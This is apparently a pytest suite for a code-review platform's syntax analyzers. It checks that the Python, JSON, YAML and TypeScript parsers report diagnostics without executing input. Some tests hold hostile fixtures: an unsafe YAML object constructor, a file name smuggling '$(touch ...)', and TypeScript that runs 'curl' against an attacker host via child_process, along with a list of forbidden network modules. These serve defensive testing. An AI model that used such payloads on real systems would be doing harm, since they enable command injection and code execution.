from __future__ import annotations

import json
import subprocess
from dataclasses import replace

import pytest

from mr_review_platform import syntax_analyzer as syntax_module
from mr_review_platform.syntax_analyzer import (
    MAX_SOURCE_BYTES,
    JsonStdlibAnalyzer,
    PythonAstAnalyzer,
    SyntaxAnalyzerRegistry,
    TypeScriptParserAnalyzer,
    YamlSafeAnalyzer,
)


def test_fixed_registry_has_stable_catalog() -> None:
    registry = SyntaxAnalyzerRegistry()

    assert registry.catalog_version == "2026.08.1"
    assert [item.analyzer_id for item in registry.catalog()] == [
        "typescript-parser",
        "python-ast",
        "json-stdlib",
        "yaml-safe-loader",
    ]
    assert all(item.config_hash.startswith("sha256:") for item in registry.catalog())
    assert registry.catalog() == SyntaxAnalyzerRegistry().catalog()


@pytest.mark.parametrize(
    ("file_path", "content", "target_version"),
    [
        ("app.py", "name = '中文'\n", "3.12"),
        ("empty.py", "", "python3.12"),
        ("config.json", '{"message":"中文"}', None),
        ("empty.yaml", "", None),
        ("config.yml", "message: 中文\n", None),
    ],
)
def test_valid_python_json_and_yaml_are_diagnostic_free(
    file_path: str,
    content: str,
    target_version: str | None,
) -> None:
    result = SyntaxAnalyzerRegistry().analyze(file_path, content, target_version)

    assert result.status == "ok"
    assert result.reason_code is None
    assert result.diagnostics == ()


@pytest.mark.parametrize(
    ("analyzer", "file_path", "content", "target_version", "code", "evidence"),
    [
        (
            PythonAstAnalyzer(),
            "app.py",
            "def broken(:\n    pass\n",
            "3.12",
            "PY_SYNTAX_ERROR",
            "def broken(:",
        ),
        (
            JsonStdlibAnalyzer(),
            "config.json",
            '{"enabled": true,}',
            None,
            "JSON_DECODE_ERROR",
            '{"enabled": true,}',
        ),
        (
            YamlSafeAnalyzer(),
            "config.yaml",
            "root: [one, two\n",
            None,
            "YAML_PARSE_ERROR",
            "root: [one, two",
        ),
    ],
)
def test_invalid_source_produces_literal_deterministic_diagnostic(
    analyzer,
    file_path: str,
    content: str,
    target_version: str | None,
    code: str,
    evidence: str,
) -> None:
    first = analyzer.analyze(file_path, content, target_version)
    second = analyzer.analyze(file_path, content, target_version)

    assert first.status == "ok"
    assert first.reason_code is None
    assert len(first.diagnostics) == 1
    diagnostic = first.diagnostics[0]
    assert diagnostic.code == code
    assert diagnostic.literal_evidence == evidence
    assert diagnostic.rule_id.endswith(f".{code}")
    assert diagnostic.fingerprint == second.diagnostics[0].fingerprint


def test_python_requires_approved_target_version() -> None:
    result = PythonAstAnalyzer().analyze("app.py", "value = 1\n", None)

    assert result.status == "failed"
    assert result.reason_code == "TARGET_VERSION_UNKNOWN"
    assert result.diagnostics == ()


def test_python_target_version_is_applied_to_parser_grammar() -> None:
    content = "match value:\n    case 1:\n        pass\n"

    old_target = PythonAstAnalyzer().analyze("app.py", content, "3.9")
    current_target = PythonAstAnalyzer().analyze("app.py", content, "3.12")

    assert old_target.status == "ok"
    assert old_target.diagnostics[0].code == "PY_SYNTAX_ERROR"
    assert current_target.status == "ok"
    assert current_target.diagnostics == ()


def test_json_empty_document_is_a_syntax_diagnostic() -> None:
    result = JsonStdlibAnalyzer().analyze("empty.json", "", None)

    assert result.status == "ok"
    assert result.diagnostics[0].code == "JSON_DECODE_ERROR"
    assert result.diagnostics[0].line_start == 1


def test_yaml_safe_loader_rejects_python_object_constructor(tmp_path) -> None:
    marker = tmp_path / "must-not-exist"
    content = f"!!python/object/apply:pathlib.Path.write_text ['{marker}', owned]"

    result = YamlSafeAnalyzer().analyze("unsafe.yaml", content, None)

    assert result.status == "ok"
    assert result.diagnostics[0].code == "YAML_PARSE_ERROR"
    assert not marker.exists()


def test_parsers_never_execute_source_text(tmp_path) -> None:
    marker = tmp_path / "must-not-exist"
    content = f"open({str(marker)!r}, 'w').write('owned')\n"

    result = PythonAstAnalyzer().analyze("side_effect.py", content, "3.12")

    assert result.status == "ok"
    assert result.diagnostics == ()
    assert not marker.exists()


def test_unsupported_and_oversized_files_have_stable_skip_reasons() -> None:
    registry = SyntaxAnalyzerRegistry()

    unsupported = registry.analyze("query.sql", "select 1", None)
    oversized = registry.analyze("large.json", "x" * (MAX_SOURCE_BYTES + 1), None)

    assert unsupported.status == "skipped"
    assert unsupported.reason_code == "ANALYZER_UNSUPPORTED"
    assert oversized.status == "skipped"
    assert oversized.reason_code == "FILE_TOO_LARGE"


@pytest.mark.parametrize(
    ("analyzer", "file_path", "target_version"),
    [
        (PythonAstAnalyzer(), "large.py", "3.12"),
        (JsonStdlibAnalyzer(), "large.json", None),
        (YamlSafeAnalyzer(), "large.yaml", None),
        (TypeScriptParserAnalyzer(), "large.ts", None),
    ],
)
def test_all_analyzers_enforce_utf8_byte_limit_before_invocation(
    analyzer,
    file_path: str,
    target_version: str | None,
) -> None:
    content = "界" * (MAX_SOURCE_BYTES // len("界".encode()) + 1)

    result = analyzer.analyze(file_path, content, target_version)

    assert result.status == "skipped"
    assert result.reason_code == "FILE_TOO_LARGE"
    assert result.diagnostics == ()


def test_frozen_descriptor_mismatch_does_not_fall_forward() -> None:
    registry = SyntaxAnalyzerRegistry()
    descriptor = next(item for item in registry.catalog() if item.analyzer_id == "json-stdlib")

    result = registry.analyze(
        "config.json",
        "{}",
        expected=replace(descriptor, analyzer_version="future-version"),
    )

    assert result.status == "failed"
    assert result.reason_code == "ANALYZER_UNAVAILABLE"
    assert result.analyzer_version == "future-version"


def _typescript_or_skip() -> TypeScriptParserAnalyzer:
    analyzer = TypeScriptParserAnalyzer()
    if analyzer._unavailable_reason() is not None:
        pytest.skip("run npm ci in syntax_runtime to exercise the pinned TypeScript parser")
    return analyzer


@pytest.mark.parametrize(
    ("file_path", "content"),
    [
        ("main.ts", "export const value: number = 1;\n"),
        ("view.tsx", "export const view = <div>中文</div>;\n"),
        ("empty.ts", ""),
        ("imports.ts", 'import value from "not-installed"; value();\n'),
    ],
)
def test_typescript_valid_single_file_does_not_resolve_project_dependencies(
    file_path: str,
    content: str,
) -> None:
    result = _typescript_or_skip().analyze(file_path, content, None)

    assert result.status == "ok"
    assert result.reason_code is None
    assert result.diagnostics == ()


@pytest.mark.parametrize(
    ("file_path", "content", "expected_code"),
    [
        ("main.tsx", "export const s;", "TS1155"),
        ("main.ts", "const value: = 1;", "TS1110"),
        ("view.tsx", "const view = <div>;", "TS17008"),
    ],
)
def test_typescript_parser_reports_stable_grammar_diagnostics(
    file_path: str,
    content: str,
    expected_code: str,
) -> None:
    analyzer = _typescript_or_skip()

    first = analyzer.analyze(file_path, content, None)
    second = analyzer.analyze(file_path, content, None)

    assert first.status == "ok"
    assert first.diagnostics[0].code == expected_code
    assert first.diagnostics[0].literal_evidence == content
    assert first.diagnostics[0].rule_id == f"syntax.typescript.{expected_code}"
    assert first.diagnostics[0].fingerprint == second.diagnostics[0].fingerprint


def test_typescript_runner_uses_fixed_command_and_structured_io(monkeypatch) -> None:
    analyzer = TypeScriptParserAnalyzer()
    captured: dict[str, object] = {}

    monkeypatch.setattr(analyzer, "_unavailable_reason", lambda: None)
    monkeypatch.setattr(analyzer, "_node_binary", lambda: "/platform/bin/node")

    def fake_run(command, **kwargs):
        captured["command"] = command
        captured.update(kwargs)
        request = json.loads(kwargs["input"])
        assert request == {
            "protocol_version": "syntax-analyzer/v1",
            "file_path": "main.ts",
            "content": "const value: = 1;",
            "script_kind": "TS",
        }
        response = {
            "protocol_version": "syntax-analyzer/v1",
            "status": "ok",
            "diagnostics": [
                {
                    "code": "TS1110",
                    "message": "Type expected.",
                    "line_start": 1,
                    "column_start": 14,
                    "line_end": 1,
                    "column_end": 15,
                    "literal_evidence": "const value: = 1;",
                }
            ],
        }
        return subprocess.CompletedProcess(command, 0, stdout=json.dumps(response), stderr="")

    monkeypatch.setattr(syntax_module.subprocess, "run", fake_run)

    result = analyzer.analyze("main.ts", "const value: = 1;", None)

    assert result.status == "ok"
    assert captured["command"] == ["/platform/bin/node", str(analyzer._runner)]
    assert captured["shell"] is False
    assert captured["check"] is False
    assert captured["cwd"] == analyzer._runtime_dir
    assert captured["env"] == {
        "LANG": "C.UTF-8",
        "LC_ALL": "C.UTF-8",
        "NODE_NO_WARNINGS": "1",
        "PATH": syntax_module.os.defpath,
    }


def test_typescript_repository_input_never_becomes_a_command_or_network_action(
    monkeypatch,
) -> None:
    analyzer = TypeScriptParserAnalyzer()
    malicious_path = "src/$(touch NEVER_CREATED).ts"
    malicious_content = "require('node:child_process').exec('curl https://attacker.invalid');\n"
    captured: dict[str, object] = {}
    monkeypatch.setattr(analyzer, "_unavailable_reason", lambda: None)
    monkeypatch.setattr(analyzer, "_node_binary", lambda: "/platform/bin/node")

    def fake_run(command, **kwargs):
        captured["command"] = command
        captured.update(kwargs)
        return subprocess.CompletedProcess(
            command,
            0,
            stdout=json.dumps(
                {
                    "protocol_version": "syntax-analyzer/v1",
                    "status": "ok",
                    "diagnostics": [],
                }
            ),
            stderr="",
        )

    monkeypatch.setattr(syntax_module.subprocess, "run", fake_run)

    result = analyzer.analyze(malicious_path, malicious_content, None)

    assert result.status == "ok"
    command = captured["command"]
    assert isinstance(command, list)
    assert command == ["/platform/bin/node", str(analyzer._runner)]
    assert malicious_path not in command
    assert malicious_content not in command
    assert captured["shell"] is False
    assert captured["cwd"] == analyzer._runtime_dir
    request = json.loads(str(captured["input"]))
    assert request["file_path"] == malicious_path
    assert request["content"] == malicious_content

    runner_source = analyzer._runner.read_text(encoding="utf-8")
    for forbidden_module in (
        "node:child_process",
        "node:http",
        "node:https",
        "node:net",
        "node:dns",
    ):
        assert forbidden_module not in runner_source
    for project_command in ("npm ", "pnpm ", "yarn ", "npx "):
        assert project_command not in runner_source


def test_typescript_timeout_and_invalid_output_are_not_reported_as_clean(monkeypatch) -> None:
    analyzer = TypeScriptParserAnalyzer()
    monkeypatch.setattr(analyzer, "_unavailable_reason", lambda: None)
    monkeypatch.setattr(analyzer, "_node_binary", lambda: "/platform/bin/node")

    def time_out(*_args, **_kwargs):
        raise subprocess.TimeoutExpired("node", 3)

    monkeypatch.setattr(syntax_module.subprocess, "run", time_out)
    timed_out = analyzer.analyze("main.ts", "const value = 1;", None)

    monkeypatch.setattr(
        syntax_module.subprocess,
        "run",
        lambda *args, **kwargs: subprocess.CompletedProcess(
            args[0], 0, stdout="not-json", stderr=""
        ),
    )
    crashed = analyzer.analyze("main.ts", "const value = 1;", None)

    assert timed_out.status == "failed"
    assert timed_out.reason_code == "ANALYZER_TIMEOUT"
    assert crashed.status == "failed"
    assert crashed.reason_code == "ANALYZER_CRASH"


def test_typescript_missing_runtime_is_unavailable(monkeypatch) -> None:
    analyzer = TypeScriptParserAnalyzer()
    monkeypatch.setattr(analyzer, "_node_binary", lambda: None)

    result = analyzer.analyze("main.ts", "const value = 1;", None)

    assert result.status == "failed"
    assert result.reason_code == "ANALYZER_UNAVAILABLE"


def test_diagnostic_to_finding_preserves_deterministic_source_data() -> None:
    result = JsonStdlibAnalyzer().analyze("config.json", "{]", None)

    medium = result.to_findings(in_build_scope=False)[0]
    high = result.to_findings(in_build_scope=True)[0]

    assert medium.severity == "medium"
    assert high.severity == "high"
    assert medium.category == "correctness"
    assert medium.confidence == 100
    assert medium.rule_id == result.diagnostics[0].rule_id
    assert medium.evidence == result.diagnostics[0].literal_evidence
    assert medium.fingerprint == result.diagnostics[0].fingerprint
    assert medium.source_pass == "syntax:json-stdlib@cpython-3.12-json-v1"
